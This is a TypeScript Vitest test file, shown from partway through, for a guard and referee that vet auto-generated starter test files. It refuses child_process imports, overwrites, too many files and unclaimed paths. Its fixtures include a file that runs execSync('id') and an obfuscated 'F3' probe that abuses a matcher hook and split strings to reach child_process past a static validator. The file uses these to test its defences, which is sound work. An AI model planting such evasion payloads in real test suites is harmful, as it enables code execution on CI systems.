    expect((await refereeOf([pkg], s, { isolatedTestJob: true })).issues.map((i) => i.message).join(' ')).toMatch(/express.*allowlist/);
    const evil = { ...(plan.files[0] as CreatedFile), content: `${GOOD2}import cp from 'node:child_process';\n` };
    expect((await refereeOf([evil], s, { isolatedTestJob: true })).issues.map((i) => i.message).join(' ')).toMatch(/node:child_process/);
  });
  it('the guard refuses what the leaf refuses, an overwrite, and more than 20 files', async () => {
    const s = svc();
    const { root, base } = repoDir({ 'api/package.json': PJ, 'api/test/old.test.js': GOOD });
    const run = (files: CreatedFile[]) => guardCreatedFiles(files, { root, baseTree: base, installRecord: null, profile: profileOf([s]), closure: null, isolatedTestJob: true });
    const evil = cf('api/test/e.test.js', "import { it, expect } from 'vitest';\nimport cp from 'node:child_process';\nit('a', () => { expect(cp).toBeTruthy(); });\n");
    const g = await run([evil, cf('api/test/old.test.js'), cf('api/test/ok.test.js')]);
    expect(g.ok.map((f) => f.path)).toEqual(['api/test/ok.test.js']);
    expect(g.refused.map((r) => r.path).sort()).toEqual(['api/test/e.test.js', 'api/test/old.test.js']);
    expect(g.refused.find((r) => r.path === 'api/test/e.test.js')?.reason).toMatch(/node:child_process/);
    expect(g.refused.find((r) => r.path === 'api/test/old.test.js')?.reason).toMatch(/never overwrites/);
    const many = await run(Array.from({ length: 21 }, (_, i) => cf(`api/test/t${i}.test.js`)));
    expect(many.refused).toHaveLength(21);
    expect(many.refused[0]?.reason).toMatch(/at most 20/);
    // a dependency read from the service's own package.json is allowed, an unlisted one is not
    // a dependency listed in the service's own package.json is NOT importable (S9 amended, D7 round 3); an allowed built-in is
    expect((await run([cf('api/test/d.test.js', GOOD2)])).refused).toEqual([]);
    const dep = await run([cf('api/test/d.test.js', WITH_PKG)]);
    expect(dep.refused[0]?.reason).toMatch(/express/);
    expect((await run([cf('api/test/d.test.js', WITH_PKG.replaceAll('express', 'lodash'))])).refused[0]?.reason).toMatch(/lodash/);
  });
  it('M1: the guard refuses a new tests-part file at a test-shaped path the starter rule does not claim, whatever its content', async () => {
    const s = svc();
    const { root, base } = repoDir({ 'api/package.json': PJ });
    const evil = "import { it, expect } from 'vitest';\nimport { execSync } from 'node:child_process';\nit('a', () => { expect(execSync('id').length).toBeGreaterThan(0); });\n";
    const paths = ['api/test/a.spec.ts', 'api/test/vitest.config.test.ts', 'api/src/a.test.ts', 'api/test/a.test.ts', 'api/tests/helpers/h.ts', 'api/other/a.txt'];
    const g = await guardCreatedFiles(paths.map((p) => cf(p, evil)), { root, baseTree: base, installRecord: null, profile: profileOf([s]), closure: null, isolatedTestJob: true });
    expect(g.ok).toEqual([]);
    expect(g.refused.map((r) => r.path).sort()).toEqual([...paths].sort());
    expect(g.refused.find((r) => r.path === 'api/test/a.spec.ts')?.reason).toMatch(/starter test|tests part|not a path/);
    // a good file at a claimed path, and the package edits (part tests, claimed by their own rules), still pass
    const good = await guardCreatedFiles([cf('api/test/a.test.js')], { root, baseTree: base, installRecord: null, profile: profileOf([s]), closure: null, isolatedTestJob: true });
    expect(good.refused).toEqual([]);
  });
  it('the registry judge: a python or pnpm service, and a service folder named test, are refused or handled', async () => {
    const files = [cf('api/test/a.test.js')];
    for (const s of [svc({ language: 'python', packageManager: 'pip' }), svc({ packageManager: 'pnpm' })]) {
      expect((await refereeOf(files, s, { isolatedTestJob: true })).issues.map((i) => i.message).join(' ')).toMatch(/Python comes in v0\.4|npm services/);
    }
  });
  it('the registry rule claims exactly the starter-test paths: no more than the creator may write', () => {
    const d = draftOf([svc()]);
    const claim = (p: string) => CREATED_RULES.filter((r) => r.match(p, d)).map((r) => r.id);
    expect(claim('api/test/a.test.ts')).toEqual(['starter-tests']);
    for (const p of ['api/test/a.spec.ts', 'api/test/a.test.tsx', 'api/test/a.test.jsx', 'api/test/vitest.config.test.ts', 'api/tests/prettier.config.test.ts', 'api/test/x.json', 'api/tests/helpers/h.ts']) expect(claim(p), p).toEqual([]);
  });
});

// ---- final review I1: D7-R7 holds at the referee and the guard too, not only in the producer ----
describe('D7-R7 at the referee and the guard: no starter-test file without the isolated test job', () => {
  // r5's f3 probe (it ran `id` in the D7 r5 review): the validator is not the boundary, so the switch must hold wherever a test file can enter
  const F3 = "import { it, expect } from 'vitest';\nlet got: any;\nconst k = ['constr', 'uctor'].join('');\nit('a', () => {\n  const f = () => 1;\n  expect(f).toEqual(expect.objectContaining({ [k]: { asymmetricMatch: (v: any) => { got = v; return true; } } }));\n  const src = 'return process.getBuilt' + 'inModule(\"child' + '_process\").execSync(\"id\").toString()';\n  console.log('F3', got(src)());\n  expect(1 + 1).toBe(2);\n});\n";
  const ISOLATED = /isolated CI job \(no secrets, no network, read-only token\), and that job is not set up in this version/;
  const refereeWith = (files: CreatedFile[], s: Service, inputs: Record<string, unknown>) => referee(files, draftOf([s]), platform(), reviewedList(), LINTERS, 'tok', { runLinters: async () => [], createdInputs: inputs as never });
  function repo(files: Record<string, string>): { root: string; base: BaseTree } {
    const root = mkdtempSync(join(tmpdir(), 'pipegen-i1-'));
    made.push(root);
    for (const [p, t] of Object.entries(files)) { mkdirSync(join(root, dirname(p)), { recursive: true }); writeFileSync(join(root, p), t); }
    return { root, base: { complete: true, entries: new Map(Object.entries(files).map(([p, t]) => [p, { sha: gitBlobSha(t), mode: '100644', read: async () => t }])) } };
  }

  it('the referee refuses f3, and a harmless test, unless createdInputs.isolatedTestJob is true', async () => {
    const s = svc();
    for (const inputs of [{}, { isolatedTestJob: false }, { isolatedTestJob: 'true' }]) {
      for (const content of [F3, GOOD]) {
        const r = await refereeWith([cf('api/test/f3.test.ts', content)], s, inputs);
        expect(r.ok, JSON.stringify(inputs)).toBe(false);
        expect(r.issues.map((i) => i.message).join(' ')).toMatch(ISOLATED);
      }
    }
    // with the flag the harmless file passes (the validator still runs as defense in depth)
    expect((await refereeWith([cf('api/test/ok.test.js', GOOD2)], s, { isolatedTestJob: true })).issues).toEqual([]);
  });
  it('the guard refuses f3, and a harmless test, unless GuardCtx.isolatedTestJob is true', async () => {
    const s = svc();
    const { root, base } = repo({ 'api/package.json': '{"name":"api"}\n' });
    for (const flag of [undefined, false]) {
      const g = await guardCreatedFiles([cf('api/test/f3.test.ts', F3), cf('api/test/ok.test.js', GOOD2)], { root, baseTree: base, installRecord: null, profile: profileOf([s]), ...(flag === undefined ? {} : { isolatedTestJob: flag }) });
      expect(g.ok).toEqual([]);
      expect(g.refused.map((r) => r.path).sort()).toEqual(['api/test/f3.test.ts', 'api/test/ok.test.js']);
      for (const r of g.refused) expect(r.reason).toMatch(ISOLATED);
    }
    const on = await guardCreatedFiles([cf('api/test/ok.test.js', GOOD2)], { root, baseTree: base, installRecord: null, profile: profileOf([s]), isolatedTestJob: true });
    expect(on.refused).toEqual([]);
  });
  it('the guard refuses the replacement of pipegen\'s own earlier starter test without the flag (a Plan G re-run)', async () => {
    const s = svc();
    const { root, base } = repo({ 'api/package.json': '{"name":"api"}\n', 'api/test/ok.test.js': GOOD2 });
    const installRecord = { files: [{ path: 'api/test/ok.test.js', part: 'tests' as const, sha: gitBlobSha(GOOD2), created: true }] };
    const off = await guardCreatedFiles([cf('api/test/ok.test.js', F3)], { root, baseTree: base, installRecord, profile: profileOf([s]) });
    expect(off.ok).toEqual([]);
    expect(off.refused[0]?.reason).toMatch(ISOLATED);
    const on = await guardCreatedFiles([cf('api/test/ok.test.js', GOOD)], { root, baseTree: base, installRecord, profile: profileOf([s]), isolatedTestJob: true });
    expect(on.ok.map((f) => f.path)).toEqual(['api/test/ok.test.js']);
  });
  it('the referee, the guard and the producer say it with the same words', async () => {
    const s = svc();
    const r = await refereeWith([cf('api/test/a.test.js')], s, {});
    const { root, base } = repo({ 'api/package.json': '{"name":"api"}\n' });
    const g = await guardCreatedFiles([cf('api/test/a.test.js')], { root, baseTree: base, installRecord: null, profile: profileOf([s]) });
    const p = await createStarterTests(s, profileOf([s]), bundle, mockAi([ans([])]).p, deps({ isolatedTestJob: false }));
    const words = (t: string): string => (ISOLATED.exec(t) ?? [''])[0];
    expect(words(r.issues[0]?.message ?? '')).not.toBe('');
    expect(words(g.refused[0]?.reason ?? '')).toBe(words(r.issues[0]?.message ?? ''));
    expect(words(p.notes[0] ?? '')).toBe(words(r.issues[0]?.message ?? ''));
  });
});
